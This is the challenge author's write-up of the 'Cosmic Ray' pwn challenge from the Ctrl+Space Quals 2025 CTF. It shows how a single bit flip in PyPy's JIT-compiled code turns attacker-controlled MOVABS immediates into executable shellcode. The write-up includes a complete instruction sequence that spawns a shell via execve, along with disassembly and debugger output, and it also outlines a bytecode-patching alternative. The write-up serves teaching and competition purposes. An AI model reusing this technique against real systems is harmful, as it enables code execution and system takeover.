---
title: "Cosmic Ray - Ctrl+Space Quals 2025"
date: "2025-10-02"
description: "The official writeup  for the challenge Cosmic Ray from the Ctrl+Space Quals 2025 CTF"
tags: ["pwn", "ctf", "ctrl", "space", "mhackeroni"]
showAuthor: false
---

Author: [mebeim](https://github.com/mebeim) (Marco Bonelli)

Full source code of the challenge is available [here](https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/)

> I had written a perfect program, when all of a sudden... a cosmic ray was
> enough to pwn my entire system :(


## Description

*For a TL;DR of the solution, just check the comments in [`expl.py`](https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/expl.py).*

The challenge consists of a simple Python 3 program ([`app.py`](https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/src/app.py)) ran
by the [PyPy][pypy] interpreter that implements a CLI to create and invoke
custom Python `lambda` functions. These functions can be created using a limited
set of whitelisted operations, take a single argument and return a single value.

```none
Available commands:
    [B]uild a function
    [C]all a function
    [L]ist functions
    [T]rigger a cosmic ray

> B
Name: foo
Input one operation per line, end with "END":
> ADD 10
> MUL 2
> REPEAT 5
> LIST
> END
Function created!

> L
Currently defined functions:
    foo = lambda x: list(((((x) + 10) * 2) for _ in range(5)))

> C
Name: foo
Argument: 1
Result: [22, 22, 22, 22, 22]
```

Other than that, the script also offers an interesting functionality (cosmic
ray) that allows the user to flip a bit in certain memory areas:

```py
try:
    where = int(input('Where? '), 0)
except ValueError:
    raise ValueError('Invalid input') from None

offset = where // 8
bit = where % 8

# ... scan /proc/self/maps and calculate vaddr

from cffi import FFI
FFI().cast("unsigned char *", vaddr)[0] ^= (1 << bit)
```

This bit flip is only allowed in writeable anonymous memory areas, excluding the
process stack, and is also only allowed once due to a global variable that is
set after first usage.


## Goal

The goal is clear: achieve arbitrary code execution to read the contents of the
`/flag` file. The memory areas where the bit flip is allowed are pretty much
limited to a handful of anonymous mappings: the interpreter heap (brk), the
Python heap (where most Python objects live) and a RWX mapping used by PyPy to
JIT compile Python code whenever it deems it necessary. Anything else is
seemingly untouchable (bad permissions and/or non-anonymous).

```none
$ sudo cat /proc/$(pidof pypy3)/maps
5e177bf9f000-5e177bfa0000 r--p 00000000 00:43 21012271    /usr/bin/pypy3.10-c
5e177bfa0000-5e177bfa1000 r-xp 00001000 00:43 21012271    /usr/bin/pypy3.10-c
5e177bfa1000-5e177bfa2000 r--p 00002000 00:43 21012271    /usr/bin/pypy3.10-c
5e177bfa2000-5e177bfa3000 r--p 00002000 00:43 21012271    /usr/bin/pypy3.10-c
5e177bfa3000-5e177bfa4000 rw-p 00003000 00:43 21012271    /usr/bin/pypy3.10-c
5e178c01a000-5e178c01b000 ---p 00000000 00:00 0           [heap]
5e178c01b000-5e178c01e000 rw-p 00000000 00:00 0           [heap]
7a2d7cf60000-7a2d7d0d0000 rw-p 00000000 00:00 0
7a2d7d0d0000-7a2d7d1d0000 rwxp 00000000 00:00 0
7a2d7d1f1000-7a2d7e9c3000 rw-p 00000000 00:00 0
...
```

Since the script only allows for one bit flip to happen, a viable solution must
either achieve arbitrary code execution via a single bit flip or use the initial
bit flip to disable the global variable check and allow for more (preferably
unlimited) bit flips.


## Solution

There are two main solution paths, although one of them remains theoretical and
I have not spent too much time investigating its feasibility. It is however
worth mentioning (find it below).

### Altering JITed Code

As you might already know, PyPy3 is known for its ability to Just-In-Time
compile Python code into machine code (in this case, x86-64). This is done only
if deemed necessary by the interpreter, which means only for "hot" loops. For
example, a long enough loop doing calculations or an infinite `while True` loop
are highly likely to be JITed. The JITed code is written to and executed
directly from a RWX memory region. This is a prime target for a "cosmic ray".

We can create a "hot" loop within a `lambda` function with the `REPEAT`
operation, which translates to `((EXPR) for _ in range(N))` where `N` is
controlled and `EXPR` comes from previous operations (also controlled).

A very simple lambda built with `ADD 0x1122334455` + `REPEAT 9999` + `LIST` will
be JITed by PyPy at a deterministic offset into the RWX JIT memory area. What's
more interesting is that a large enough constant (between 5 and 8 bytes) will
most likely get embedded *as is* into JITed code as an immediate for the x86
MOVABS instruction (a.k.a. MOV r64, imm64). We can also notice this
[in the PyPy codebase][pypy-jit-movabs]. This is also useful to find the
address/offset of a specific piece of JITed code from GDB:

```none
$ sudo pwndbg --pid $(pidof pypy3)
pwndbg> search -t qword --trunc-out  73588229205
Searching for an 8-byte integer: b'UD3"\x11\x00\x00\x00'
[anon_7081faf76] 0x7081faf78679 push rbp /* 0x1122334455 */
[anon_7081faf76] 0x7081faf78945 push rbp /* 0x1122334455 */
...
pwndbg> x/10i 0x7081faf78679 - 2
   0x7081faf78677:    movabs r11,0x1122334455
   0x7081faf78681:    add    rdi,r11
   0x7081faf78684:    jo     0x7081faf78c17
```

Doing simple mathematical operations with large values gives us a very good
primitive to inject arbitrary bytes into JITed code via MOVABS. Other ways are
definitely possible, but MOVABS gives us a lot of space. In particular, we have
8 controlled immediate bytes ending up in a RWX region. If we can somehow flip
some bit around the JITed code to jump into the immediate, we can use the first
6 to run some arbitrary code, and the last two to perform a short jump into the
immediate of a subsequent MOVABS instruction to continue.

A `lambda` built with a sequence of arithmetical instructions with large
immediates can easily turn into a sequence of MOVABS instructions. For example:

```none
ADD 0x1122334455
ADD 0x2233445566
ADD 0x3344556677
REPEAT 10000
LIST
END
```

Will become something like:

```none
...
movabs r11,0x1122334455
add    rdi,r11
jo     0x7bcffd7a0c87
mov    QWORD PTR [rbx+0x28],0xe
mov    QWORD PTR [rbp+0x158],rdi
movabs r11,0x2233445566
add    rdi,r11
jo     0x7bcffd7a0ca3
mov    QWORD PTR [rbx+0x28],0x12
mov    QWORD PTR [rbp+0x158],rdi
movabs r11,0x3344556677
add    rdi,r11
jo     0x7bcffd7a0cbf
...
```

Taking a look at how MOVABS is encoded, we have:

```none
49 bb 55 44 33 22 11 00 00 00    movabs r11, 0x1122334455
```

Flipping bit 3 of the second byte turns the instruction into:

```none
49 b3 55    rex.WB mov r11b,  0x55
44 33 22    xor    r12d,  DWORD PTR [rdx]
11 00       adc    DWORD PTR [rax],  eax
...
```

Other variations are also possible, like:

```none
49 9b       rex.WB fwait
55          push   rbp
44 33 22    xor    r12d,  DWORD PTR [rdx]
11 00       adc    DWORD PTR [rax],  eax
...
```

*`fwait`... you really never stop learning new x86 instructions, huh?*

One single bit flip is therefore enough to start executing part of the original
MOVABS immediate we provide as code. We can encode an initial JMP ahead into the
next immediate, perform some instructions, JMP imm8 to the next, and repeat.
This is more than enough to pop a shell.

The only thing we must pay attention to is a small optimization performed by the
PyPy JIT compiler when dealing with consecutive integer values that are "close
enough" to each other (within 32-bit distance). Doing the same as above with
`ADD 0x1122334455` followed by `ADD 0x1122334466` will JIT compile into:

```none
movabs r11,0x1122334455
add    rdi,r11
jo     0x7a721ea94c47
mov    QWORD PTR [rbx+0x28],0xe
mov    QWORD PTR [rbp+0x158],rdi
lea    r11,[r11+0x11]              <<<<<<
add    rdi,r11
jo     0x7a721ea94c63
```

Not a problem if our immediates are "far enough" from each other in value, but
even then, all is fine with a bit of juggling around.

Now it's GG. We can read in more shellcode, run existing code (we can definitely
break ASLR now), or even just directly pop a shell via `execve`. The final
sequence of instructions I used to call
`execve("/bin/sh", {"/bin/sh", NULL}, NULL)` looks like this:

```none
ADD 0x01010101011ceb90  ->  jmp short $+0x1e
ADD 0x17eb900068732f68  ->  push 0x68732f               '/sh\x00'
                            jmp short $+0x19
ADD 0x17eb90102424c148  ->  shl qword ptr [rsp], 16
                            jmp short $+0x19
ADD 0x17eb6e6924048166  ->  add word ptr [rsp], 0x6e69  'in'
                            jmp short $+0x19
ADD 0x17eb90102424c148  ->  shl qword ptr [rsp], 16
                            jmp short $+0x19
ADD 0x616161000000ede9  ->  jmp $+0xf2
ADD 0x61eb622f24048166  ->  add word ptr [rsp], 0x622f  '/b'
                            jmp short $+0x63
ADD 0x61eb90006ae78948  ->  mov rdi, rsp                rdi = "/bin/sh"
                            push 0
                            jmp short $+0x63
ADD 0x61eb9090e6894857  ->  push rdi
                            mov rsi, rsp                rsi = {"/bin/sh", NULL}
                            jmp short $+0x63
ADD 0x61eb3bb0c031d231  ->  xor edx, edx                rdx = NULL
                            xor eax, eax
                            mov al, 0x3b                rax = __NR_execve
                            jmp short $+0x63
ADD 0x61eb90909090050f  ->  syscall
REPEAT 10000
LIST
```

The first instruction is changed from `movabs r11, 0x01010101011ceb90` to
`rex.WB mov r11b, 0x90; jmp short $+0x1e`, which starts the whole thing. The
only quirk about this solution is that after a few MOVABS instructions PyPy
inserts additional checks in the JITed code, causing the offset between
subsequent MOVABS to change. There is also a big gap in the middle where I have
to waste an entire immediate to fit a JMP off32 (5 bytes). In any case, no big
deal.

### Alternate Solution: Altering Python Bytecode

As we all know Python is an interpreted language with an intermediate bytecode
representation that is executed by the interpreter virtual machine. Instead of
focusing on what happens after the PyPy JIT kicks in, we could also alter the
Python bytecode itself. Assuming that the bytecode for script functions is
stored in one of the memory areas we can modify, and assuming that its offset is
fixed (or at least stable enough), flipping a bit to modify the bytecode can
drastically modify the script's behavior.

There is no obvious way to use a single bit flip to obtain arbitrary [byte]code
execution, let alone re-use some part of existing bytecode to open, read and
print the contents of an arbitrary file. If we want to modify bytecode we will
have to do so to bypass the single cosmic ray limit, and then use more cosmic
rays to edit existing bytecode at will.

If we take a look at the bytecode for the `cosmic_ray()` function using
[`dis.dis()`][py-dis-dis] we can see a few interesting spots where flipping a
bit would result in bypassing the global variable check, allowing infinite
"cosmic rays" to hit. We can also access the raw bytecode as a `bytes` object
via `cosmic_ray.__code__.co_code` to check actual opcodes and arguments.

Some interestig opcodes to consider for the bit flip are right at the start and
towards the end of the function:

```none
0    LOAD_GLOBAL         0 (COSMIC_RAY_HIT)
2    POP_JUMP_IF_FALSE   8 (to 16)
...
324  LOAD_CONST         22 (True)
326  STORE_GLOBAL        0 (COSMIC_RAY_HIT)
...
```

The opcode for `POP_JUMP_IF_FALSE` is 0x72: flipping its LSB turns it into 0x73,
which is `POP_JUMP_IF_TRUE`. This would simply negate the `if` condition and
allow for unlimited cosmic rays after the first call to the function (which sets
`COSMIC_RAY_HIT = True` befor return).

Similarly, changing the argument for `STORE_GLOBAL` to something other than 0
would cause the script to create a new global variable instead of modifying
`COSMIC_RAY_HIT`. Modifying one of the above opcodes into something else may
also work, depending on the specific case.

There are however a couple of problems with this approach:

1. We are working with offsets into memory, and not absolute addresses. While
   the memory layout seems pretty stable at first, the `cosmic_ray()` functions
   imports the `cffi` module, causing a bunch of mappings to be created and also
   moving existing Python objects around. This results in a not-so-predictable
   layout after the first invocation. Subsequent invocations to perform more
   bit flips would need to take this into account.
2. Depending on which opcode we choose to modify and how, we might end up
   crashing the interpreter either via internal check failures or plain and
   simple segmentation faults. For example, I have noticed that changing
   `STORE_GLOBAL 0` to `STORE_GLOBAL 8` (thus creating `FFI = True` globally)
   works on Ubuntu 24 `pypy3`, but crashes with a HLT for Alpine `pypy3` (used
   in the challenge container). YMMV.

This is the main reason I did not explore this solution path any further. It
does however still seem within the realm of possibility.


### Complete Exploit

See [`expl.py`](https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/expl.py) for the complete exploit. A simplified version is
available at [`checker/__main__.py`](https://github.com/mebeim/ctf-challenges/blob/master/challenges/cosmic-ray/checker/__main__.py) and is intended to be
used as an automated status check.


[pypy]: https://www.pypy.org
[pypy-jit-movabs]: https://github.com/pypy/pypy/blob/76657ba47f6d48c7db77615d3a26bd5029f8b05a/rpython/jit/backend/x86/rx86.py#L886
[py-dis-dis]: https://docs.python.org/3/library/dis.html#dis.dis